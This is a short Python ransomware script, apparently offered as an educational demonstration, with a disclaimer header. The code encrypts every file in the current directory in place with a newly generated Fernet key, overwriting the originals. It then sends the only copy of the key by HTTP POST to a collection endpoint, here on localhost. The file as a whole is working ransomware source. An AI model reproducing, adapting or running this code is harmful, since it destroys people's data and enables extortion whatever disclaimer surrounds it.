import os
from cryptography.fernet import Fernet
from pathlib import Path
import threading
import requests

# EDUCATIONAL SECURITY RESEARCH ONLY!!!
#
# This project is a controlled demonstration of ransomware concepts,
# including file encryption, key generation, and key transmission.
#
# It is intended exclusively for authorized testing in isolated,
# disposable environments. Do not run this software on systems or
# files you do not own or have explicit permission to test.
#
# This project is not intended for deployment, distribution, or use
# against real systems, users, or data.
#
# Inspired by NetworkChuck's educational ransomware demonstration.
#
# The author does not endorse malicious use of this code and is not
# responsible for misuse or unauthorized activity.

# Make sure you run ransomware.py inside of a non important folder with dummy/test files.

# Made By SQL 2026
# SQL INJECTION STUDIOS
# https://sqlinjectionstudios.com

files = [] # This will have all the enumerated files.

for file in os.listdir(): # Put all files into list list
    if file in {"main.py", "secret.key", "decrypt.py", "test.py", "ransomware.py"}: # All files listed here will not be encrypted, they will be ignored.
        continue
    
    if os.path.isfile(file):
        files.append(file)

    
encryption_key = Fernet.generate_key() # This is the important key



for file in files:  # Encryption Magic.
    with open(file, "rb") as thefile:
        file_content = thefile.read()

    contents_encrypted = Fernet(encryption_key).encrypt(file_content) 

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


# we should add a check to see if the webserver is even online in the Future!
response = requests.post(
    "http://127.0.0.1:8000/upload/upload.php",
    data=encryption_key
)

# i guess add text for other status codes?
if response.status_code == 200:
    print(f"{response.status_code} OK!")
else:
    print(response.status_code)

print(response.text)
